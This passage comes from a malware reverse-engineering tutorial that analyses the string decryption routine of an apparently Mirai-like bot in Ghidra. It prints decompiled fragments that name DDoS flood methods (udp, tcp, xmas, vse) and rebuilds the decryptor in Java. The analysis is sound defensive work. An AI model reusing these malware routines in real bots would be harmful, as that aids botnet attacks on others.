      <span class="kw1">if</span> <span class="br0">&#40;</span>bindResult <span class="sy0">==</span> <span class="sy0">-</span><span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw3">exit</span><span class="br0">&#40;</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      listen<span class="br0">&#40;</span>__fd<span class="sy0">,</span><span class="nu0">1</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p><a name ="string-decryption"></a></p>
<h2><a href="#string-decryption">String decryption</a></h2>
<p>The <em>encryption_init</em> is a simple function, in the sense that it calls the same function (<em>encryption</em>) several times, before it returns. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> encryption_init<span class="br0">&#40;</span><span class="kw4">void</span><span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  encryption<span class="br0">&#40;</span>enc_udp<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,&amp;</span>DAT_00407cf7<span class="br0">&#41;</span><span class="sy0">;</span>
  encryption<span class="br0">&#40;</span>enc_tcp<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,&amp;</span>DAT_00407cfb<span class="br0">&#41;</span><span class="sy0">;</span>
  encryption<span class="br0">&#40;</span>enc_http<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,&amp;</span>DAT_00407cff<span class="br0">&#41;</span><span class="sy0">;</span>
  encryption<span class="br0">&#40;</span>enc_std<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,&amp;</span>DAT_00407d04<span class="br0">&#41;</span><span class="sy0">;</span>
  encryption<span class="br0">&#40;</span>enc_xmas<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,&amp;</span>DAT_00407d08<span class="br0">&#41;</span><span class="sy0">;</span>
  encryption<span class="br0">&#40;</span>enc_vse<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,&amp;</span>DAT_00407d0d<span class="br0">&#41;</span><span class="sy0">;</span>
  encryption<span class="br0">&#40;</span>enc_proc_kill<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;A*A*t)sB&amp;&amp;uDx&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  encryption<span class="br0">&#40;</span>enc_name<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;oDwD$*&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  encryption<span class="br0">&#40;</span>enc_unknown<span class="sy0">,</span><span class="nu0">2</span><span class="sy0">,</span><span class="st0">&quot;x$s$Dt$&quot;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>The <em>encryption</em> function (with comitted locals) is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw4">void</span> encryption<span class="br0">&#40;</span>undefined8 <span class="sy0">*</span>puParm1<span class="sy0">,</span><span class="kw4">int</span> iParm2<span class="sy0">,</span><span class="kw4">char</span> <span class="sy0">*</span>pcParm3<span class="br0">&#41;</span>
<span class="br0">&#123;</span>
  <span class="kw4">char</span> cVar2<span class="sy0">;</span>
  ulong uVar2<span class="sy0">;</span>
  ulong uVar3<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar4<span class="sy0">;</span>
  <span class="kw4">char</span> <span class="sy0">*</span>pcVar3<span class="sy0">;</span>
  <span class="kw4">int</span> local_20<span class="sy0">;</span>
  <span class="kw4">int</span> local_1c<span class="sy0">;</span>
  uint local_18<span class="sy0">;</span>
  <span class="kw4">int</span> local_14<span class="sy0">;</span>
  <span class="kw4">int</span> local_10<span class="sy0">;</span>
  uint local_c<span class="sy0">;</span>
  <span class="kw4">char</span> cVar1<span class="sy0">;</span>
&nbsp;
  <span class="kw1">if</span> <span class="br0">&#40;</span>iParm2 <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    local_20 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    local_1c <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    <span class="sy0">*</span>puParm1 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    <span class="kw1">do</span> <span class="br0">&#123;</span>
      uVar2 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
      pcVar4 <span class="sy0">=</span> pcParm3<span class="sy0">;</span>
      <span class="kw1">do</span> <span class="br0">&#123;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>uVar2 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
        uVar2 <span class="sy0">=</span> uVar2 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
        cVar1 <span class="sy0">=</span> <span class="sy0">*</span>pcVar4<span class="sy0">;</span>
        pcVar4 <span class="sy0">=</span> pcVar4 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
      <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar1 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>~uVar2 <span class="sy0">-</span> <span class="nu0">1</span> <span class="sy0">&lt;=</span> <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_20<span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="sy0">*</span><span class="br0">&#40;</span>undefined <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_1c <span class="sy0">+</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>puParm1<span class="br0">&#41;</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
        <span class="kw1">return</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      local_18 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
      <span class="kw1">while</span> <span class="br0">&#40;</span>local_18 <span class="sy0">&lt;</span> <span class="nu12">0x41</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="kw1">if</span> <span class="br0">&#40;</span>pcParm3<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_20<span class="br0">&#93;</span> <span class="sy0">==</span> dec<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_18<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
          <span class="sy0">*</span><span class="br0">&#40;</span>undefined <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_1c <span class="sy0">+</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>puParm1<span class="br0">&#41;</span> <span class="sy0">=</span> enc<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_18<span class="br0">&#93;</span><span class="sy0">;</span>
          local_1c <span class="sy0">=</span> local_1c <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
        <span class="br0">&#125;</span>
        local_18 <span class="sy0">=</span> local_18 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      local_20 <span class="sy0">=</span> local_20 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>iParm2 <span class="sy0">!=</span> <span class="nu0">2</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
    <span class="kw1">return</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  local_14 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  local_10 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="sy0">*</span>puParm1 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="kw1">do</span> <span class="br0">&#123;</span>
    uVar3 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
    pcVar3 <span class="sy0">=</span> pcParm3<span class="sy0">;</span>
    <span class="kw1">do</span> <span class="br0">&#123;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>uVar3 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
      uVar3 <span class="sy0">=</span> uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
      cVar2 <span class="sy0">=</span> <span class="sy0">*</span>pcVar3<span class="sy0">;</span>
      pcVar3 <span class="sy0">=</span> pcVar3 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar2 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>~uVar3 <span class="sy0">-</span> <span class="nu0">1</span> <span class="sy0">&lt;=</span> <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_14<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="sy0">*</span><span class="br0">&#40;</span>undefined <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_10 <span class="sy0">+</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>puParm1<span class="br0">&#41;</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
      <span class="kw1">return</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    local_c <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    <span class="kw1">while</span> <span class="br0">&#40;</span>local_c <span class="sy0">&lt;</span> <span class="nu12">0x41</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>pcParm3<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_14<span class="br0">&#93;</span> <span class="sy0">==</span> enc<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_c<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        <span class="sy0">*</span><span class="br0">&#40;</span>undefined <span class="sy0">*</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_10 <span class="sy0">+</span> <span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>puParm1<span class="br0">&#41;</span> <span class="sy0">=</span> dec<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_c<span class="br0">&#93;</span><span class="sy0">;</span>
        local_10 <span class="sy0">=</span> local_10 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      local_c <span class="sy0">=</span> local_c <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    local_14 <span class="sy0">=</span> local_14 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">&#125;</span> <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>When looking at the <em>encryption</em> function, it is apparent that the second parameter is used to execute a part of the function. Below, the code structure is highlighted.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">if</span> <span class="br0">&#40;</span>iParm2 <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="co1">//Do something</span>
<span class="br0">&#125;</span> 
<span class="kw1">if</span> <span class="br0">&#40;</span>iParm2 <span class="sy0">!=</span> <span class="nu0">2</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw1">return</span><span class="sy0">;</span>
<span class="br0">&#125;</span>
<span class="co1">//Do something else</span></pre></div></div></div></div></div></div></div>


<p>The compiler generates the above given structure based on an if-else structure, as shown below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1"><span class="kw1">if</span> <span class="br0">&#40;</span>iParm2 <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="co1">//Do something</span>
<span class="br0">&#125;</span> <span class="kw1">else</span> <span class="kw1">if</span> <span class="br0">&#40;</span>iParm2 <span class="sy0">==</span> <span class="nu0">2</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="co1">//Do something else</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>In all occurences, the value <em>2</em> is used for the second parameter. Therefore, one can assume that the second parameter defines the mode that is used within the function. The first parameter is a global string, whereas the third parameter is a literal string. Based on these observations, the signature of the <em>encryption</em> function can be represented as follows.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">encryption<span class="br0">&#40;</span><span class="kw4">char</span> <span class="sy0">*</span>output<span class="sy0">,</span> <span class="kw4">int</span> mode<span class="sy0">,</span> <span class="kw4">char</span> <span class="sy0">*</span>input<span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>Aside from renaming the three variables in Ghidra, the type of the first variable also needs to be redefined. Instead of <em>undefined8</em>, the type is a <em>char *</em>. To decrypt the strings, one ony has to look at the code that is executed when the <em>mode</em> is equal to <em>2</em>. The code segment is given below, after which it will be optimised and rewritten in Java.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">  local_14 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  local_10 <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="sy0">*</span><span class="br0">&#40;</span>undefined8 <span class="sy0">*</span><span class="br0">&#41;</span>output <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
  <span class="kw1">do</span> <span class="br0">&#123;</span>
    uVar3 <span class="sy0">=</span> <span class="nu12">0xffffffffffffffff</span><span class="sy0">;</span>
    pcVar3 <span class="sy0">=</span> input<span class="sy0">;</span>
    <span class="kw1">do</span> <span class="br0">&#123;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>uVar3 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
      uVar3 <span class="sy0">=</span> uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
      cVar2 <span class="sy0">=</span> <span class="sy0">*</span>pcVar3<span class="sy0">;</span>
      pcVar3 <span class="sy0">=</span> pcVar3 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
    <span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar2 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
    <span class="kw1">if</span> <span class="br0">&#40;</span>~uVar3 <span class="sy0">-</span> <span class="nu0">1</span> <span class="sy0">&lt;=</span> <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_14<span class="br0">&#41;</span> <span class="br0">&#123;</span>
      output<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_10<span class="br0">&#93;</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
      <span class="kw1">return</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    local_c <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
    <span class="kw1">while</span> <span class="br0">&#40;</span>local_c <span class="sy0">&lt;</span> <span class="nu12">0x41</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
      <span class="kw1">if</span> <span class="br0">&#40;</span>input<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_14<span class="br0">&#93;</span> <span class="sy0">==</span> enc<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_c<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
        output<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_10<span class="br0">&#93;</span> <span class="sy0">=</span> dec<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_c<span class="br0">&#93;</span><span class="sy0">;</span>
        local_10 <span class="sy0">=</span> local_10 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
      <span class="br0">&#125;</span>
      local_c <span class="sy0">=</span> local_c <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
    <span class="br0">&#125;</span>
    local_14 <span class="sy0">=</span> local_14 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">&#125;</span> <span class="kw1">while</span><span class="br0">&#40;</span> <span class="kw2">true</span> <span class="br0">&#41;</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The variable <em>uVar3</em> is made equal to <em>0xffffffffffffffff</em> in the decompiler. When looking in the disassembly, one can see that the value is actually <em>-1</em>.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="asm"><pre class="de1"><span class="co2">0040217b</span>                 <span class="kw1">MOV</span>        uVar3<span class="sy1">,-</span><span class="nu0">0x1</span></pre></div></div></div></div></div></div></div>


<p>The decryption code seems to be rather complete based on the decompiled code. However, there are a few parts that are not optimised. The variables <em>enc</em> and <em>dec</em> are two arrays, both of which are 64 bytes in size.</p>
<p>The second do-while loop looks more complicated than it is. The code is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">uVar3 <span class="sy0">=</span> <span class="sy0">-</span><span class="nu0">1</span><span class="sy0">;</span> <span class="co1">//Written as 0xffffffffffffffff in the decompiled code</span>
pcVar3 <span class="sy0">=</span> input<span class="sy0">;</span>
<span class="kw1">do</span> <span class="br0">&#123;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>uVar3 <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
  uVar3 <span class="sy0">=</span> uVar3 <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
  cVar2 <span class="sy0">=</span> <span class="sy0">*</span>pcVar3<span class="sy0">;</span>
  pcVar3 <span class="sy0">=</span> pcVar3 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>cVar2 <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span>~uVar3 <span class="sy0">-</span> <span class="nu0">1</span> <span class="sy0">&lt;=</span> <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_14<span class="br0">&#41;</span> <span class="br0">&#123;</span>
<span class="co1">//[omitted code]</span></pre></div></div></div></div></div></div></div>


<p>The loop is broken when <em>uVar3</em> (a copy of <em>input</em>) is equal to <em>0</em>, or when <em>cVar2</em> is not equal to <em>0</em>. A string is terminated with a <em>NULL</em> byte, meaning that the loop is only broken when the end of the <em>input</em> string has been reached.</p>
<p>Within the loop, <em>uVar3</em> is decreased with 1 in each iteration. The variable <em>cVar2</em> is set equal to the current address of <em>pcVar3</em>, after which <em>pcVar3</em>&#8216;s value is incremented with one. This effectively moves <em>cVar2</em> to the next character of the string in the next iteration.</p>
<p>Based on this, the code can be rewritten as follows:</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">count <span class="sy0">=</span>  <span class="sy0">-</span><span class="nu0">1</span><span class="sy0">;</span> <span class="co1">//Written as 0xffffffffffffffff in the decompiled code</span>
input_copy <span class="sy0">=</span> input<span class="sy0">;</span>
<span class="kw1">do</span> <span class="br0">&#123;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>count <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">&#41;</span> <span class="kw2">break</span><span class="sy0">;</span>
  count <span class="sy0">=</span> count <span class="sy0">-</span> <span class="nu0">1</span><span class="sy0">;</span>
  currentCharacter <span class="sy0">=</span> <span class="sy0">*</span>input_copy<span class="sy0">;</span>
  input_copy <span class="sy0">=</span> input_copy <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span> <span class="kw1">while</span> <span class="br0">&#40;</span>currentCharacter <span class="sy0">!=</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">&#40;</span>~count <span class="sy0">-</span> <span class="nu0">1</span> <span class="sy0">&lt;=</span> <span class="br0">&#40;</span>ulong<span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_14<span class="br0">&#41;</span> <span class="br0">&#123;</span>
<span class="co1">//[omitted code]</span></pre></div></div></div></div></div></div></div>


<p>The count starts at <em>-1</em> and is decreased with <em>1</em> for every character that the <em>input</em> is long. The if-statement in the line below inverts the value of <em>count</em>, after which <em>1</em> is subtracted. The initial value of the variable is <em>-1</em>, after which the inverse value is decreased with <em>1</em>. These two actions negate eachother, meaning that they can both be left out. The variable <em>count</em> is thus equal to <em>0</em> in the beginning. When the loop has finished, <em>count</em> is equal to the length of the <em>input</em> string.</p>
<p>On can write this as a single line of code to increase the readability. The code below is in Java.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="java"><pre class="de1"><span class="kw4">int</span> count <span class="sy0">=</span> input.<span class="me1">length</span><span class="sy0">;</span></pre></div></div></div></div></div></div></div>


<p>The if-statement contains two variables: <em>count</em> and <em>local_14</em>. The latter is increased with <em>1</em> at the bottom of the function. This variable can therefore be renamed to <em>iterationCount</em>.</p>
<p>The if-statement&#8217;s body sets the value at <em>output[local_10]</em> to <em>0</em>, after which the function returns. This part of the code is only reached when the string is fully decrypted, since this is the only way to return from this endless loop.</p>
<p>In the end of the function, there is a while-loop that contains the two variables that have not been renamed yet.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="c"><pre class="de1">local_c <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
<span class="kw1">while</span> <span class="br0">&#40;</span>local_c <span class="sy0">&lt;</span> <span class="nu12">0x41</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="kw1">if</span> <span class="br0">&#40;</span>input<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>iterationCount<span class="br0">&#93;</span> <span class="sy0">==</span> enc<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_c<span class="br0">&#93;</span><span class="br0">&#41;</span> <span class="br0">&#123;</span>
	output<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span>local_10<span class="br0">&#93;</span> <span class="sy0">=</span> dec<span class="br0">&#91;</span><span class="br0">&#40;</span><span class="kw4">long</span><span class="br0">&#41;</span><span class="br0">&#40;</span><span class="kw4">int</span><span class="br0">&#41;</span>local_c<span class="br0">&#93;</span><span class="sy0">;</span>
	local_10 <span class="sy0">=</span> local_10 <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
  <span class="br0">&#125;</span>
  local_c <span class="sy0">=</span> local_c <span class="sy0">+</span> <span class="nu0">1</span><span class="sy0">;</span>
<span class="br0">&#125;</span></pre></div></div></div></div></div></div></div>


<p>Due to the compiler&#8217;s assembly code, Ghidra shows this is a while-loop. It is likely that in the source code, the while-loop was actually a for-loop where <em>local_c</em> was named <em>i</em>. Renaming this variable creates code that is more readable. To increase the readability even more, one can rename <em>local_10</em> to <em>j</em>.</p>
<p>Note that the for-loop iterates <em>0x41</em> (65 in decimal) times. In Java, the string terminator (a single byte at the end of the string that is equal to <em>0x00</em>) does not exist. Therefore the loop should only iterate <em>0x40</em> (64 in decimal) times.</p>
<p>Also note that the string that is required for the input, requires an additional <em>0</em> at the end, since the other loops expect the string terminator to be present.</p>
<p>The byte arrays named <em>enc</em> and <em>dec</em> can be copied into the decryption program. The optimised output can then be used to decrypt the given strings. The Java program to decrypt a given string is given below.</p>


<div class="wp-geshi-highlight-wrap5"><div class="wp-geshi-highlight-wrap4"><div class="wp-geshi-highlight-wrap3"><div class="wp-geshi-highlight-wrap2"><div class="wp-geshi-highlight-wrap"><div class="wp-geshi-highlight"><div class="java"><pre class="de1"><span class="co3">/**
 * Decrypts a given &lt;code&gt;input&lt;/code&gt; string, after which the decrypted
 * output is printed.
 *
 * @author Max 'Libra' Kersten [@Libranalysis]
 */</span>
<span class="kw1">public</span> <span class="kw1">static</span> <span class="kw4">void</span> main<span class="br0">&#40;</span><span class="kw3">String</span><span class="br0">&#91;</span><span class="br0">&#93;</span> args<span class="br0">&#41;</span> <span class="br0">&#123;</span>
  <span class="co1">//Gets the enc variable that is declared below</span>
  <span class="kw4">byte</span><span class="br0">&#91;</span><span class="br0">&#93;</span> enc <span class="sy0">=</span> getEnc<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="co1">//Gets the dec variable that is declared below</span>
  <span class="kw4">byte</span><span class="br0">&#91;</span><span class="br0">&#93;</span> dec <span class="sy0">=</span> getDec<span class="br0">&#40;</span><span class="br0">&#41;</span><span class="sy0">;</span>
  <span class="co1">//The byte array to store the output in. In this sample, there is no string that exceeds the size of 100 bytes</span>
  <span class="kw4">byte</span><span class="br0">&#91;</span><span class="br0">&#93;</span> output <span class="sy0">=</span> <span class="kw1">new</span> <span class="kw4">byte</span><span class="br0">&#91;</span><span class="nu0">100</span><span class="br0">&#93;</span><span class="sy0">;</span>
  <span class="co1">//The input which needs to be decrypted (note the &quot;0&quot; at the end to include the null byte in the iterations</span>
